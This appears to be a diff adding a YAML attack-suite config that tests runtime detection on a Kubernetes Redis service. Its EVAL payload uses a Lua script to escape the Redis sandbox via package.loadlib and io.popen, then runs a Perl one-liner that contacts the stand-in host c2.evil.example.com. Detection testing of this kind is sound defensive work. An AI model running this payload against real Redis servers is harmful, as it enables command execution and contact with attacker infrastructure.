@@ -1,0 +1,38 @@
+apiVersion: bobctl.k8sstormcenter.io/v1alpha1
+kind: AttackSuite
+metadata:
+  name: redis-attack-11-reverse-shell-perl
+  description: "Perl HTTP request to C2 domain (unexpected process + DNS). Triggers R0001."
+target:
+  service: redis
+  namespace: redis
+  port: 6379
+  protocol: redis
+attacks:
+  - name: reverse-shell-perl-http
+    type: fileless
+    redis:
+      eval: |
+        local io_mod = nil
+        pcall(function()
+          if type(io) == 'table' and io.popen then io_mod = io end
+        end)
+        if not io_mod then
+          pcall(function()
+            local loader = package.loadlib('/usr/lib/x86_64-linux-gnu/liblua5.1.so.0', 'luaopen_io')
+            if loader then io_mod = loader() end
+          end)
+        end
+        if not io_mod then return 'sandbox_blocked' end
+        local f = io_mod.popen("perl -e 'use IO::Socket::INET;my $s=IO::Socket::INET->new(PeerAddr=>\"c2.evil.example.com\",PeerPort=>80,Timeout=>2);print defined $s ? \"connected\" : \"connect_failed\";' 2>&1; echo perl_http_done")
+        local out = f:read('*a')
+        f:close()
+        return 'revshell:' .. out
+    successIndicators:
+      - responseContains: "revshell:"
+expectedDetections:
+  - attackType: fileless
+    ruleID: R0001
+    ruleName: "Unexpected process launched"
+    containerName: redis
+    command: perl
